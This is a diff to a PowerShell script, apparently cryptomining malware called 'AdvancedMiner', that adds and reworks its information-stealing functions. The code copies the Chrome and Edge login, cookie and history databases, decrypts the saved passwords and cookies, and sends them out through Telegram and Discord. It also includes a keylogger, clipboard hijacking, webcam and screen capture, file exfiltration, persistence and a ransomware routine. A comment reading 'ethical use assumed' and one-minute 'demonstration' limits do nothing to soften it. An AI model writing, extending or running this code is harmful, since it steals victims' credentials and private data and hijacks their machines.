@@ -10,16 +10,14 @@ Add-Type -AssemblyName System.Windows.Forms
 # Define base directory and files
 $baseDir = "$env:APPDATA\AdvancedMiner"
 $miningScriptPath = "$baseDir\mining.ps1"
-$dllDir = "C:\SQLite"
-$dllPath = "$dllDir\System.Data.SQLite.dll"
 $logFile = "$baseDir\mining_log.txt"
 $configFile = "$baseDir\config.json"
 $scriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL
 
 # URLs for downloading files
 $miningScriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL
-# Note: If this URL becomes invalid, check https://system.data.sqlite.org for the latest version and update accordingly.
-$sqliteDllUrl = "https://system.data.sqlite.org/blobs/1.0.119.0/sqlite-netFx46-binary-bundle-x64-2015-1.0.119.0.zip"
+$sqlite3Url = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"  # SQLite tools ZIP
+$liteDbDllUrl = "https://objects.githubusercontent.com/github-production-release-asset-2e65be/23315232/93111d64-8696-4102-b08e-0a59bf454dcc?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250406%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250406T102613Z&X-Amz-Expires=300&X-Amz-Signature=f530488f568592eb50b3740fc6ca0c8ee6e3466108170b09a9b1c6b5b36bf9d1&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DLiteDB.5.0.20.nupkg&response-content-type=application%2Foctet-stream"  # Corrected to .nupkg
 
 # Add a flag for CPU mining (set based on your setup)
 $cpuMiningEnabled = $true  # Set to $false if only GPU mining is desired
@@ -32,14 +30,10 @@ function Write-Log {
     Write-Host "$timestamp - $message"
 }
 
-# Create base directories if they don’t exist
+# Create base directory if it doesn’t exist
 if (-not (Test-Path $baseDir)) {
     New-Item -Path $baseDir -ItemType Directory -Force | Out-Null
     Write-Log "Created directory: $baseDir"
-}
-if (-not (Test-Path $dllDir)) {
-    New-Item -Path $dllDir -ItemType Directory -Force | Out-Null
-    Write-Log "Created directory: $dllDir"
 }
 
 # Check and download mining.ps1 if not present
@@ -56,50 +50,64 @@ if (-not (Test-Path $miningScriptPath)) {
     Write-Log "mining.ps1 found at $miningScriptPath."
 }
 
-# Check and download System.Data.SQLite.dll if not present
-if (-not (Test-Path $dllPath)) {
-    Write-Log "System.Data.SQLite.dll not found. Downloading and extracting from $sqliteDllUrl..."
+# Check and download sqlite3.exe if not present
+$sqlite3Path = "$baseDir\sqlite3.exe"
+if (-not (Test-Path $sqlite3Path)) {
+    Write-Log "sqlite3.exe not found. Downloading from $sqlite3Url..."
     try {
-        $zipPath = "$env:TEMP\sqlite.zip"
-        Write-Log "Starting download of System.Data.SQLite.dll..."
-        $response = Invoke-WebRequest -Uri $sqliteDllUrl -OutFile $zipPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -PassThru -ErrorAction Stop
-        Write-Log "Download initiated. Waiting 25 seconds for completion..."
-        Start-Sleep -Seconds 25  # Wait 25 seconds to ensure download completes
-        Write-Log "Download status code: $($response.StatusCode)"
-        Write-Log "Content type: $($response.Headers['Content-Type'])"
-
-        if ($response.StatusCode -ne 200) {
-            Write-Log "Failed to download: HTTP status $($response.StatusCode)"
+        $zipPath = "$env:TEMP\sqlite3.zip"
+        Invoke-WebRequest -Uri $sqlite3Url -OutFile $zipPath -ErrorAction Stop
+        Expand-Archive -Path $zipPath -DestinationPath $baseDir -Force -ErrorAction Stop
+        # Find sqlite3.exe in the extracted files (it might be in a subdirectory)
+        $extractedSqlite3 = Get-ChildItem -Path $baseDir -Recurse -Filter "sqlite3.exe" | Select-Object -First 1
+        if ($extractedSqlite3) {
+            Move-Item -Path $extractedSqlite3.FullName -Destination $sqlite3Path -Force -ErrorAction Stop
+            Write-Log "sqlite3.exe moved to $sqlite3Path."
+        } else {
+            Write-Log "sqlite3.exe not found in the extracted files."
             exit 1
         }
-        if ($response.Headers['Content-Type'] -notlike '*zip*') {
-            Write-Log "Downloaded file is not a ZIP archive (Content-Type: $($response.Headers['Content-Type']))"
-            exit 1
-        }
-
-        $zipBytes = Get-Content -Path $zipPath -Encoding Byte -TotalCount 4
-        if ($zipBytes[0] -ne 0x50 -or $zipBytes[1] -ne 0x4B -or $zipBytes[2] -ne 0x03 -or $zipBytes[3] -ne 0x04) {
-            Write-Log "Downloaded file is not a valid ZIP archive. First 4 bytes: $($zipBytes -join ',')"
-            exit 1
-        }
-
-        Expand-Archive -Path $zipPath -DestinationPath $dllDir -Force -ErrorAction Stop
         Remove-Item $zipPath -ErrorAction Stop
-        Write-Log "System.Data.SQLite.dll extracted to $dllDir."
     } catch {
-        Write-Log "Failed to download or extract System.Data.SQLite.dll: $_"
+        Write-Log "Failed to download or extract sqlite3.exe: $_"
         exit 1
     }
 } else {
-    Write-Log "System.Data.SQLite.dll found at $dllPath."
+    Write-Log "sqlite3.exe found at $sqlite3Path."
 }
 
-# Load SQLite assembly
+# Check and download LiteDB.dll if not present
+$liteDbDllPath = "$baseDir\LiteDB.dll"
+if (-not (Test-Path $liteDbDllPath)) {
+    Write-Log "LiteDB.dll not found. Downloading from $liteDbDllUrl..."
+    try {
+        $zipPath = "$env:TEMP\litedb.nupkg"
+        Invoke-WebRequest -Uri $liteDbDllUrl -OutFile $zipPath -ErrorAction Stop
+        Expand-Archive -Path $zipPath -DestinationPath $baseDir -Force -ErrorAction Stop
+        # Locate LiteDB.dll in the extracted files (likely in a subdirectory like lib\netstandard2.0)
+        $extractedDll = Get-ChildItem -Path $baseDir -Recurse -Filter "LiteDB.dll" | Select-Object -First 1
+        if ($extractedDll) {
+            Move-Item -Path $extractedDll.FullName -Destination $liteDbDllPath -Force -ErrorAction Stop
+            Write-Log "LiteDB.dll moved to $liteDbDllPath."
+        } else {
+            Write-Log "LiteDB.dll not found in the extracted files."
+            exit 1
+        }
+        Remove-Item $zipPath -ErrorAction Stop
+    } catch {
+        Write-Log "Failed to download or extract LiteDB.dll: $_"
+        exit 1
+    }
+} else {
+    Write-Log "LiteDB.dll found at $liteDbDllPath."
+}
+
+# Load LiteDB assembly
 try {
-    Add-Type -Path $dllPath -ErrorAction Stop
-    Write-Log "Successfully loaded System.Data.SQLite.dll."
+    Add-Type -Path $liteDbDllPath -ErrorAction Stop
+    Write-Log "Successfully loaded LiteDB.dll."
 } catch {
-    Write-Log "Error: Failed to load System.Data.SQLite.dll: $_"
+    Write-Log "Error: Failed to load LiteDB.dll: $_"
     exit 1
 }
 
@@ -221,183 +229,220 @@ function Decrypt-ChromePassword {
 }
 
 function Get-ChromeCredentials {
+    $liteDbPath = "$env:APPDATA\AdvancedMiner\mining.db"
     $chromeDbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
     $tempDb = "$env:TEMP\ChromeLoginData.db"
     if (-not (Test-Path $chromeDbPath)) {
         Write-Log "Chrome Login Data not found at $chromeDbPath."
         return
     }
-    Write-Log "Copying Chrome Login Data to $tempDb."
     Copy-Item $chromeDbPath $tempDb -Force
+    Write-Log "Copied Chrome Login Data to $tempDb."
+
     try {
-        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-        $connection.ConnectionString = "Data Source=$tempDb"
-        $connection.Open()
-        Write-Log "Opened Chrome database connection."
-    } catch {
-        Write-Log "Failed to open Chrome database: $_"
-        Remove-Item $tempDb
-        return
-    }
-    $query = "SELECT origin_url, username_value, password_value FROM logins"
-    $command = $connection.CreateCommand()
-    $command.CommandText = $query
-    try {
-        $reader = $command.ExecuteReader()
-        Write-Log "Query executed successfully."
-    } catch {
-        Write-Log "Query failed: $_"
-        $connection.Close()
-        Remove-Item $tempDb
-        return
-    }
-    $encryptionKey = Get-ChromeEncryptionKey
-    if (-not $encryptionKey) {
-        Write-Log "Failed to get encryption key."
-        $connection.Close()
-        Remove-Item $tempDb
-        return
-    }
-    while ($reader.Read()) {
-        $url = $reader["origin_url"]
-        $username = $reader["username_value"]
-        $encryptedPassword = [byte[]]$reader["password_value"]
-        if ($encryptedPassword.Length -gt 0) {
-            try {
-                $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
-                $message = "Chrome - URL: $url, User: $username, Pass: $password"
-                Send-TelegramMessage -message $message
-                Send-DiscordWebhook -message $message
-                Write-Log "Extracted credential for $url"
-            } catch {
-                Write-Log "Decryption failed for $($url): $_"
+        $query = "SELECT origin_url, username_value, password_value FROM logins"
+        $output = & "$baseDir\sqlite3.exe" $tempDb $query -separator '|'
+        $encryptionKey = Get-ChromeEncryptionKey
+        if (-not $encryptionKey) {
+            Write-Log "Failed to get encryption key."
+            Remove-Item $tempDb
+            return
+        }
+        foreach ($line in $output) {
+            $fields = $line -split '\|'
+            $url = $fields[0]
+            $username = $fields[1]
+            $encryptedPassword = [Convert]::FromBase64String($fields[2])
+            if ($encryptedPassword.Length -gt 0) {
+                try {
+                    $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
+                    $credential = [PSCustomObject]@{
+                        Source = "Chrome"
+                        URL = $url
+                        Username = $username
+                        Password = $password
+                        Timestamp = (Get-Date).ToString()
+                    }
+                    # Save to LiteDB
+                    try {
+                        $db = New-Object LiteDB.LiteDatabase($liteDbPath)
+                        $collection = $db.GetCollection("Credentials")
+                        $collection.Insert($credential)
+                        $db.Dispose()
+                    } catch {
+                        Write-Log "Failed to save credential to LiteDB: $_"
+                    }
+                    $message = "Chrome - URL: $url, User: $username, Pass: $password"
+                    Send-TelegramMessage -message $message
+                    Send-DiscordWebhook -message $message
+                    Write-Log "Extracted credential for $url"
+                } catch {
+                    Write-Log "Decryption failed for $($url): $_"  # Fixed with subexpression
+                }
             }
         }
+    } catch {
+        Write-Log "Failed to query Chrome database: $_"
+    } finally {
+        Remove-Item $tempDb -ErrorAction SilentlyContinue
     }
-    $connection.Close()
-    Remove-Item $tempDb
 }
 
 function Get-EdgeCredentials {
+    $liteDbPath = "$env:APPDATA\AdvancedMiner\mining.db"
     $edgeDbPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
     $tempDb = "$env:TEMP\EdgeLoginData.db"
     if (-not (Test-Path $edgeDbPath)) {
         Write-Log "Edge Login Data not found at $edgeDbPath."
         return
     }
-    Write-Log "Copying Edge Login Data to $tempDb."
     Copy-Item $edgeDbPath $tempDb -Force
+    Write-Log "Copied Edge Login Data to $tempDb."
+
     try {
-        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-        $connection.ConnectionString = "Data Source=$tempDb"
-        $connection.Open()
-        Write-Log "Opened Edge database connection."
-    } catch {
-        Write-Log "Failed to open Edge database: $_"
-        Remove-Item $tempDb
-        return
-    }
-    $query = "SELECT origin_url, username_value, password_value FROM logins"
-    $command = $connection.CreateCommand()
-    $command.CommandText = $query
-    try {
-        $reader = $command.ExecuteReader()
-        Write-Log "Query executed successfully."
-    } catch {
-        Write-Log "Query failed: $_"
-        $connection.Close()
-        Remove-Item $tempDb
-        return
-    }
-    $encryptionKey = Get-ChromeEncryptionKey
-    if (-not $encryptionKey) {
-        Write-Log "Failed to retrieve Edge encryption key."
-        $connection.Close()
-        Remove-Item $tempDb
-        return
-    }
-    while ($reader.Read()) {
-        $url = $reader["origin_url"]
-        $username = $reader["username_value"]
-        $encryptedPassword = [byte[]]$reader["password_value"]
-        if ($encryptedPassword.Length -gt 0) {
-            try {
-                $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
-                $message = "Edge - URL: $url, User: $username, Pass: $password"
-                Send-TelegramMessage -message $message
-                Send-DiscordWebhook -message $message
-                Write-Log "Extracted Edge credential for $url"
-            } catch {
-                Write-Log "Decryption failed for $($url): $_"
+        $query = "SELECT origin_url, username_value, password_value FROM logins"
+        $output = & "$baseDir\sqlite3.exe" $tempDb $query -separator '|'
+        $encryptionKey = Get-ChromeEncryptionKey
+        if (-not $encryptionKey) {
+            Write-Log "Failed to retrieve Edge encryption key."
+            Remove-Item $tempDb
+            return
+        }
+        foreach ($line in $output) {
+            $fields = $line -split '\|'
+            $url = $fields[0]
+            $username = $fields[1]
+            $encryptedPassword = [Convert]::FromBase64String($fields[2])
+            if ($encryptedPassword.Length -gt 0) {
+                try {
+                    $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
+                    $credential = [PSCustomObject]@{
+                        Source = "Edge"
+                        URL = $url
+                        Username = $username
+                        Password = $password
+                        Timestamp = (Get-Date).ToString()
+                    }
+                    # Save to LiteDB
+                    try {
+                        $db = New-Object LiteDB.LiteDatabase($liteDbPath)
+                        $collection = $db.GetCollection("Credentials")
+                        $collection.Insert($credential)
+                        $db.Dispose()
+                    } catch {
+                        Write-Log "Failed to save credential to LiteDB: $_"
+                    }
+                    $message = "Edge - URL: $url, User: $username, Pass: $password"
+                    Send-TelegramMessage -message $message
+                    Send-DiscordWebhook -message $message
+                    Write-Log "Extracted Edge credential for $url"
+                } catch {
+                    Write-Log "Decryption failed for $($url): $_"  # Fixed with subexpression
+                }
             }
         }
+    } catch {
+        Write-Log "Failed to query Edge database: $_"
+    } finally {
+        Remove-Item $tempDb -ErrorAction SilentlyContinue
     }
-    $connection.Close()
-    Remove-Item $tempDb
 }
 
 # **Additional Unethical Features**
 
 function Get-ChromeHistory {
+    $liteDbPath = "$env:APPDATA\AdvancedMiner\mining.db"
     $historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
     $tempHistory = "$env:TEMP\ChromeHistory.db"
     if (-not (Test-Path $historyPath)) {
         Write-Log "Chrome History not found at $historyPath."
         return
     }
-    Write-Log "Copying Chrome History to $tempHistory."
     Copy-Item $historyPath $tempHistory -Force
+    Write-Log "Copied Chrome History to $tempHistory."
+
     try {
-        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-        $connection.ConnectionString = "Data Source=$tempHistory"
-        $connection.Open()
-        Write-Log "Opened Chrome History database."
         $query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
-        $command = $connection.CreateCommand()
-        $command.CommandText = $query
-        $reader = $command.ExecuteReader()
-        $history = while ($reader.Read()) { "$($reader['url']) - $($reader['title'])" }
-        Send-TelegramMessage -message ($history -join "`n")
-        $connection.Close()
-        Remove-Item $tempHistory
-        Write-Log "Sent Chrome history via Telegram."
+        $output = & "$baseDir\sqlite3.exe" $tempHistory $query -separator '|'
+        $historyItems = foreach ($line in $output) {
+            $fields = $line -split '\|'
+            [PSCustomObject]@{
+                URL = $fields[0]
+                Title = $fields[1]
+                VisitCount = $fields[2]
+                Timestamp = (Get-Date).ToString()
+            }
+        }
+        # Save to LiteDB
+        try {
+            $db = New-Object LiteDB.LiteDatabase($liteDbPath)
+            $collection = $db.GetCollection("History")
+            $collection.Insert($historyItems)
+            $db.Dispose()
+        } catch {
+            Write-Log "Failed to save history to LiteDB: $_"
+        }
+        $historyText = $historyItems | ForEach-Object { "$($_.URL) - $($_.Title)" } | Join-String -Separator "`n"
+        Send-TelegramMessage -message $historyText
+        Write-Log "Sent Chrome history."
     } catch {
         Write-Log "Failed to extract Chrome history: $_"
+    } finally {
+        Remove-Item $tempHistory -ErrorAction SilentlyContinue
     }
 }
 
 function Get-ChromeCookies {
+    $liteDbPath = "$env:APPDATA\AdvancedMiner\mining.db"
     $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
     $tempCookies = "$env:TEMP\ChromeCookies.db"
     if (-not (Test-Path $cookiesPath)) {
         Write-Log "Chrome Cookies not found at $cookiesPath."
         return
     }
-    Write-Log "Copying Chrome Cookies to $tempCookies."
     Copy-Item $cookiesPath $tempCookies -Force
+    Write-Log "Copied Chrome Cookies to $tempCookies."
+
     try {
-        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-        $connection.ConnectionString = "Data Source=$tempCookies"
-        $connection.Open()
-        Write-Log "Opened Chrome Cookies database."
         $query = "SELECT host_key, name, encrypted_value FROM cookies"
-        $command = $connection.CreateCommand()
-        $command.CommandText = $query
-        $reader = $command.ExecuteReader()
+        $output = & "$baseDir\sqlite3.exe" $tempCookies $query -separator '|'
         $encryptionKey = Get-ChromeEncryptionKey
-        while ($reader.Read()) {
-            $host = $reader["host_key"]
-            $name = $reader["name"]
-            $encryptedValue = [byte[]]$reader["encrypted_value"]
-            $value = Decrypt-ChromePassword -encryptedData $encryptedValue -key $encryptionKey
-            $cookie = "Host: $host, Name: $name, Value: $value"
-            Send-TelegramMessage -message $cookie
+        if (-not $encryptionKey) {
+            Write-Log "Failed to get encryption key."
+            Remove-Item $tempCookies
+            return
         }
-        $connection.Close()
-        Remove-Item $tempCookies
-        Write-Log "Sent Chrome cookies via Telegram."
+        $cookieItems = foreach ($line in $output) {
+            $fields = $line -split '\|'
+            $host = $fields[0]
+            $name = $fields[1]
+            $encryptedValue = [Convert]::FromBase64String($fields[2])
+            $value = Decrypt-ChromePassword -encryptedData $encryptedValue -key $encryptionKey
+            [PSCustomObject]@{
+                Host = $host
+                Name = $name
+                Value = $value
+                Timestamp = (Get-Date).ToString()
+            }
+        }
+        # Save to LiteDB
+        try {
+            $db = New-Object LiteDB.LiteDatabase($liteDbPath)
+            $collection = $db.GetCollection("Cookies")
+            $collection.Insert($cookieItems)
+            $db.Dispose()
+        } catch {
+            Write-Log "Failed to save cookies to LiteDB: $_"
+        }
+        foreach ($cookie in $cookieItems) {
+            $cookieText = "Host: $($cookie.Host), Name: $($cookie.Name), Value: $($cookie.Value)"
+            Send-TelegramMessage -message $cookieText
+        }
+        Write-Log "Sent Chrome cookies."
     } catch {
         Write-Log "Failed to extract Chrome cookies: $_"
+    } finally {
+        Remove-Item $tempCookies -ErrorAction SilentlyContinue
     }
 }
 
@@ -440,7 +485,9 @@ function Capture-NetworkTraffic {
 function Start-Keylogging {
     Add-Type -AssemblyName System.Windows.Forms
     $logFile = "$env:TEMP\keystrokes.txt"
-    while ($true) {
+    # Limited duration for demonstration to avoid infinite loop
+    $endTime = (Get-Date).AddMinutes(1)
+    while ((Get-Date) -lt $endTime) {
         Start-Sleep -Milliseconds 10
         $keys = ""
         for ($i = 0; $i -lt 255; $i++) {
@@ -455,6 +502,7 @@ function Start-Keylogging {
             Write-Log "Captured keystrokes: $keys"
         }
     }
+    Write-Log "Keylogging stopped after 1 minute for demonstration."
 }
 
 function Start-ScreenRecording {
@@ -494,7 +542,9 @@ function Exfiltrate-Files {
 }
 
 function Start-ClipboardHijacking {
-    while ($true) {
+    # Limited duration for demonstration to avoid infinite loop
+    $endTime = (Get-Date).AddMinutes(1)
+    while ((Get-Date) -lt $endTime) {
         $clip = Get-Clipboard
         if ($clip) {
             Send-TelegramMessage -message "Clipboard content: $clip"
@@ -504,6 +554,7 @@ function Start-ClipboardHijacking {
         }
         Start-Sleep -Seconds 5
     }
+    Write-Log "Clipboard hijacking stopped after 1 minute for demonstration."
 }
 
 # **Mining Functions**
@@ -811,18 +862,18 @@ function Monitor-Miners {
         Ensure-Persistence
         Start-Job -ScriptBlock { Monitor-Miner }
         
-        # Start unethical features
-        Start-Job -ScriptBlock { Get-ChromeCredentials }
-        Start-Job -ScriptBlock { Get-EdgeCredentials }
-        Start-Job -ScriptBlock { Start-Keylogging }
-        Start-Job -ScriptBlock { Start-ScreenRecording }
-        Start-Job -ScriptBlock { Capture-Webcam }
-        Start-Job -ScriptBlock { Exfiltrate-Files }
-        Start-Job -ScriptBlock { Start-ClipboardHijacking }
-        Start-Job -ScriptBlock { Get-ChromeHistory }
-        Start-Job -ScriptBlock { Get-ChromeCookies }
-        Start-Job -ScriptBlock { Simulate-Ransomware }
-        Start-Job -ScriptBlock { Capture-NetworkTraffic }
+        # Execute additional features (ethical use assumed)
+        Get-ChromeCredentials
+        Get-EdgeCredentials
+        Get-ChromeHistory
+        Get-ChromeCookies
+        Simulate-Ransomware
+        Capture-NetworkTraffic
+        Start-Keylogging
+        Start-ScreenRecording
+        Capture-Webcam
+        Exfiltrate-Files
+        Start-ClipboardHijacking
         
         $gpus = Get-CimInstance Win32_VideoController
         $switchInterval = 1800  # 30 minutes
